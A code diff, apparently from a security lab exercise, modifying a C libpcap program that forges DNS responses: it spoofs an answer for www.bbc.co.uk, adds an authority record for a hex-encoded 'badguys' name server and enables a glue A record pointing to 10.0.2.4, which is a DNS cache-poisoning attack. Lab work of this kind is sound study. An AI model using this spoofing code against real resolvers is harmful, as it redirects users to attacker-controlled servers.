@@ -41,7 +41,7 @@ int main()
   bpf_u_int32 net; 
 
   //Open live pcap session on NIC with name eth0
-  handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);	  
+  handle = pcap_open_live("eth14", BUFSIZ, 1, 1000, errbuf);	  
   printf("handle is %p\n",handle);
   printf("errbuf is %s\n",errbuf);
   
@@ -79,7 +79,7 @@ void spoof_DNS_reply(struct ipheader* ip)
 
     //Calculate the checksum for integrity. UDP checksum includes the data 
     newudp->udp_sum = 0; // Set it to zero first
-    newudp->udp_sum = in_cksum((unsigned short *)newudp, ntohs(ip->iph_len) - ip_header_len);
+  //  newudp->udp_sum = in_cksum((unsigned short *)newudp, ntohs(ip->iph_len) - ip_header_len);
     newudp->udp_sport = (udp->udp_dport);
     newudp->udp_dport = (udp->udp_sport);
 
@@ -115,7 +115,7 @@ unsigned short construct_dns_reply(char *buffer)
 	char TARGET_DOMAIN[] = "www.bbc.co.uk";
 	char ANSWER_IPADDR[] = "1.2.3.4";
 	char NS_SERVER[] = "\x02\x6e\x73\x07\x62\x61\x64\x67\x75\x79\x73\x03\x63\x6f\x6d";
-	char NS_IPADDR[] = "1.2.3.5";
+	char NS_IPADDR[] = "10.0.2.4";
 
 	//construct the DNS header:
 	dns->flags=htons(0x8180); //Flag = response; this is a DNS response
@@ -124,7 +124,7 @@ unsigned short construct_dns_reply(char *buffer)
 	dns->QDCOUNT=htons(1); // 1 question field
 	dns->ANCOUNT=htons(1); // 1 answer field
 	dns->NSCOUNT=htons(1); // 1 name server(authority) field
-	dns->ARCOUNT=htons(0); // 1 additional fields
+	dns->ARCOUNT=htons(1); // 1 additional fields
 
 	char *p = buffer + 12; // move the pointer to the beginning of DNS data
 
@@ -136,7 +136,7 @@ unsigned short construct_dns_reply(char *buffer)
 
 	p += set_A_record(p, NULL, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
 	p += set_NS_record(p, NULL, 0x0C, NS_SERVER); //Add an NS record (Authority section)
-	//p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
+	p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
 	//printf("dns Length is %i",(p - buffer));
 	return p - buffer;
 }
